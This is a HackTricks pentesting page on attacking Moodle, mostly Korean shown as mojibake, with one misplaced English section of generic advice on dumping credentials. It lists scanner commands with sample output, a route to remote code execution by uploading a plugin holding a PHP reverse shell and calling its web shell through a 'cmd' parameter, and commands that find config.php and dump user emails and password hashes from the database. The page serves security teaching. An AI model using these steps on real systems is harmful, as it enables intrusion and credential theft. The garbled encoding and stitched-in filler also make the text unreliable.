# Moodle

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— ì œì¶œ**í•˜ì„¸ìš”.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**í•´í‚¹ ê²½ë ¥**ì— ê´€ì‹¬ì´ ìˆê³  í•´í‚¹í•  ìˆ˜ ì—†ëŠ” ê²ƒì„ í•´í‚¹í•˜ê³  ì‹¶ë‹¤ë©´ - **ìš°ë¦¬ëŠ” ê³ ìš© ì¤‘ì…ë‹ˆë‹¤!** (_ìœ ì°½í•œ í´ë€ë“œì–´ í•„ìˆ˜_).

{% embed url="https://www.stmcyber.com/careers" %}

## ìë™ ìŠ¤ìº”

### droopescan
```bash
pip3 install droopescan
droopescan scan moodle -u http://moodle.example.com/<moodle_path>/

[+] Plugins found:
forum http://moodle.schooled.htb/moodle/mod/forum/
http://moodle.schooled.htb/moodle/mod/forum/upgrade.txt
http://moodle.schooled.htb/moodle/mod/forum/version.php

[+] No themes found.

[+] Possible version(s):
3.10.0-beta

[+] Possible interesting urls found:
Static readme file. - http://moodle.schooled.htb/moodle/README.txt
Admin panel - http://moodle.schooled.htb/moodle/login/

[+] Scan finished (0:00:05.643539 elapsed)
```
### moodlescan

moodlescanì€ Moodle ì‹œìŠ¤í…œì— ëŒ€í•œ ì·¨ì•½ì ì„ ê²€ì‚¬í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” ë‹¤ì–‘í•œ ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³ , ì‚¬ìš©ì ê³„ì • ì •ë³´ ë…¸ì¶œ, ì·¨ì•½í•œ íŒŒì¼ ì—…ë¡œë“œ, ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ ë“±ì˜ ë¬¸ì œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

moodlescanì€ ë‹¤ìŒê³¼ ê°™ì€ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤:

- ì‚¬ìš©ì ê³„ì • ì •ë³´ ë…¸ì¶œ ì—¬ë¶€ í™•ì¸
- ì·¨ì•½í•œ íŒŒì¼ ì—…ë¡œë“œ ê°€ëŠ¥ ì—¬ë¶€ í™•ì¸
- ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ ì‹ë³„
- ì·¨ì•½í•œ ë””ë ‰í† ë¦¬ ë…¸ì¶œ ì—¬ë¶€ í™•ì¸
- ì·¨ì•½í•œ ë§í¬ ì‹ë³„
- ì·¨ì•½í•œ SQL ì¿¼ë¦¬ ì‹ë³„

moodlescanì„ ì‚¬ìš©í•˜ì—¬ Moodle ì‹œìŠ¤í…œì˜ ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³  ë³´ì•ˆì„ ê°•í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹œìŠ¤í…œì˜ ì·¨ì•½ì ì„ ë¯¸ë¦¬ íŒŒì•…í•˜ê³  ëŒ€ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
#Install from https://github.com/inc0d3/moodlescan
python3 moodlescan.py -k -u http://moodle.example.com/<moodle_path>/

Version 0.7 - Dic/2020
.............................................................................................................

By Victor Herrera - supported by www.incode.cl

.............................................................................................................

Getting server information http://moodle.schooled.htb/moodle/ ...

server         	: Apache/2.4.46 (FreeBSD) PHP/7.4.15
x-powered-by   	: PHP/7.4.15
x-frame-options	: sameorigin
last-modified  	: Wed, 07 Apr 2021 21:33:41 GMT

Getting moodle version...

Version found via /admin/tool/lp/tests/behat/course_competencies.feature : Moodle v3.9.0-beta

Searching vulnerabilities...


Vulnerabilities found: 0

Scan completed.
```
### CMSMap

CMSMapì€ ì›¹ ì‚¬ì´íŠ¸ì˜ ì½˜í…ì¸  ê´€ë¦¬ ì‹œìŠ¤í…œ(CMS)ì„ ì‹ë³„í•˜ê¸° ìœ„í•œ ë„êµ¬ì…ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” ë‹¤ì–‘í•œ CMSì— ëŒ€í•œ ì •ë³´ë¥¼ ìˆ˜ì§‘í•˜ê³ , ì·¨ì•½ì ì„ ì°¾ì•„ë‚´ê³ , ê´€ë¦¬ì íŒ¨ë„ì— ëŒ€í•œ ê¸°ë³¸ ìê²© ì¦ëª…ì„ í™•ì¸í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. CMSMapì€ ë‹¤ìŒê³¼ ê°™ì€ CMSë¥¼ ì‹ë³„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- WordPress
- Joomla
- Drupal
- Magento
- PrestaShop
- OpenCart
- TYPO3
- Bitrix
- DedeCMS
- ExpressionEngine
- MODX
- Umbraco
- vBulletin
- Zen Cart

CMSMapì€ ì›¹ ì‚¬ì´íŠ¸ì˜ CMSë¥¼ ì‹ë³„í•˜ëŠ” ë° ìœ ìš©í•œ ë„êµ¬ì…ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ì›¹ ì‚¬ì´íŠ¸ì˜ ì·¨ì•½ì ì„ íŒŒì•…í•˜ê³ , ë³´ì•ˆì„ ê°•í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
pip3 install git+https://github.com/dionach/CMSmap.git
cmsmap http://moodle.example.com/<moodle_path>
```
### CVEs

ìë™ ë„êµ¬ë“¤ì€ moodle ë²„ì „ì— ì˜í–¥ì„ ì£¼ëŠ” ì·¨ì•½ì ì„ ì°¾ëŠ” ë°ì—ëŠ” ê±°ì˜ ì“¸ëª¨ì—†ë‹¤ëŠ” ê²ƒì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤. ì´ë¥¼ í™•ì¸í•˜ë ¤ë©´ [https://snyk.io/vuln/composer:moodle%2Fmoodle](https://snyk.io/vuln/composer:moodle%2Fmoodle)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## RCE

**ë§¤ë‹ˆì €** ì—­í• ì´ í•„ìš”í•˜ë©° **"ì‚¬ì´íŠ¸ ê´€ë¦¬"** íƒ­ì—ì„œ **í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤\*\*:\*\*

![](<../../.gitbook/assets/image (447).png>)

ë§¤ë‹ˆì €ì´ë”ë¼ë„ ì´ ì˜µì…˜ì„ **í™œì„±í™”í•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤**. moodle ê¶Œí•œ ìƒìŠ¹ PoCì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://github.com/HoangKien1020/CVE-2020-14321](https://github.com/HoangKien1020/CVE-2020-14321).

ê·¸ëŸ° ë‹¤ìŒ, ë‹¤ìŒ í”ŒëŸ¬ê·¸ì¸ì„ **ì„¤ì¹˜**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í”ŒëŸ¬ê·¸ì¸ì—ëŠ” í´ë˜ì‹í•œ pentest-monkey php r**ev ì‰˜**ì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤ (ì—…ë¡œë“œí•˜ê¸° ì „ì— ì••ì¶•ì„ í’€ê³ , revshellì˜ IPì™€ í¬íŠ¸ë¥¼ ë³€ê²½í•œ ë‹¤ìŒ ë‹¤ì‹œ ì••ì¶•í•´ì•¼ í•©ë‹ˆë‹¤).

{% file src="../../.gitbook/assets/moodle-rce-plugin.zip" %}

ë˜ëŠ” "cmd" ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¼ë°˜ PHP ì‰˜ì„ ì–»ê¸° ìœ„í•´ [https://github.com/HoangKien1020/Moodle\_RCE](https://github.com/HoangKien1020/Moodle\_RCE)ì—ì„œ í”ŒëŸ¬ê·¸ì¸ì„ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

ì•…ì„± í”ŒëŸ¬ê·¸ì¸ì„ ì‹¤í–‰í•˜ë ¤ë©´ ë‹¤ìŒì— ì•¡ì„¸ìŠ¤í•´ì•¼ í•©ë‹ˆë‹¤:
```bash
http://domain.com/<moodle_path>/blocks/rce/lang/en/block_rce.php?cmd=id
```
## POST

### ë°ì´í„°ë² ì´ìŠ¤ ìê²© ì¦ëª… ì°¾ê¸°
```bash
find / -name "config.php" 2>/dev/null | grep "moodle/config.php"
```
### ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ìê²© ì¦ëª… ë¤í”„í•˜ê¸°

To dump credentials from a database, you can use various techniques depending on the type of database you are targeting. Here are some common methods:

#### 1. SQL Injection

If the target application is vulnerable to SQL injection, you can exploit this vulnerability to extract credentials from the database. By injecting malicious SQL queries, you can retrieve usernames, passwords, and other sensitive information stored in the database.

#### 2. Brute-forcing

If you have obtained a database dump file or have access to the database server, you can attempt to brute-force the credentials. This involves trying different combinations of usernames and passwords until you find a valid login.

#### 3. Exploiting Misconfigurations

Sometimes, databases are misconfigured, allowing unauthorized access to sensitive information. By identifying and exploiting these misconfigurations, you can gain access to the credentials stored in the database.

#### 4. Password Hash Cracking

If the passwords in the database are stored as hashes, you can use password cracking techniques to recover the original passwords. This involves using tools like John the Ripper or Hashcat to crack the hashes and obtain the plaintext passwords.

Remember, it is important to have proper authorization and legal permission before attempting to dump credentials from a database. Unauthorized access to databases is illegal and unethical.
```bash
/usr/local/bin/mysql -u <username> --password=<password> -e "use moodle; select email,username,password from mdl_user; exit"
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**í•´í‚¹ ê²½ë ¥**ì— ê´€ì‹¬ì´ ìˆê³  í•´í‚¹í•  ìˆ˜ ì—†ëŠ” ê²ƒì„ í•´í‚¹í•˜ê³  ì‹¶ë‹¤ë©´ - **ìš°ë¦¬ëŠ” ê³ ìš© ì¤‘ì…ë‹ˆë‹¤!** (_ìœ ì°½í•œ í´ë€ë“œì–´ í•„ìˆ˜_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°êµë¥¼ ê³µìœ í•˜ì„¸ìš”.

</details>
